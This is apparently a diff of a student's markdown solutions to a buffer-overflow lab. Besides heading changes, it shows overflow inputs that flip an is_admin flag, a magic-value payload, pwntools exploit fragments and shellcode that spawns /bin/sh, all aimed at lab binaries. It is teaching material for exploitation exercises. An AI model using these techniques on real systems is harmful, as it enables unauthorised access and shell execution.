@@ -1,12 +1,13 @@
 # Laborator 2
 
-## Solution to [Q1]:
+### Solution to [Q1]:
 If I have a boolean `is_admin` and an input buffer that stores a name, and I input more characters than the buffer can hold, the overflow could overwrite the `is_admin` value in memory. This might set `is_admin` to `true`, potentially giving unauthorized admin access.
 
-## Solution to [Q2]:
+## Exercise 1
+### Solution to [Q2]:
 The `password` buffer is 8 characters long, but if we enter more than 8 characters (for example, `aaaaaaaa1`), the extra character (`1`) overflows the buffer and can overwrite the adjacent `is_admin` variable in memory. This sets `is_admin` to `1`, which the program interprets as granting admin access, bypassing the password check.
 
-## Solution to [Q3]:
+### Solution to [Q3]:
 ```
 $ make ex1
 $ echo -n 'aaaaaaaa1' > input
@@ -29,7 +30,8 @@ pwndbg> x/10gx $rsp
 
 At address `0x7fffffffdca0`, we see the `password` buffer containing `0x6161616161616161` (which represents "aaaaaaaa"). In the next 8 bytes, at `0x7fffffffdca8`, we find `0x0000000000000031`, which corresponds to `is_admin`. This has been modified to a non-zero value (`1`), indicating that our overflow was successful.
 
-## Solution to [Q4]:
+## Exercise 2
+### Solution to [Q4]:
 ```python
 #!/usr/bin/env python3
 
@@ -55,7 +57,8 @@ $ echo -ne 'AAAAAAAA\xef\xbe\xad\xde' | ./bin/ex2
 Access granted!
 ```
 
-## Solution to [Q5]:
+## Exercise 3
+### Solution to [Q5]:
 ```python
 from pwn import *
 import os
@@ -96,14 +99,15 @@ p.sendline(payload)
 p.interactive()
 ```
 
-## Solution to [Q6]:
+## Exercise 4
+### Solution to [Q6]:
 ```c
 int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
 ```
 
 First argument is a `const char`.
 
-## Solution to [Q7]:
+### Solution to [Q7]:
 We find the address of `/bin/sh` at runtime:
 ```python
 jmp get_binsh       
@@ -156,7 +160,8 @@ target.send(payload)
 target.interactive()
 ```
 
-## Solution to Extra Challenge #1:
+## Extra Challenges
+### Solution to #1 Exploitation prodigy:
 ```python
 #!/usr/bin/env python3
 
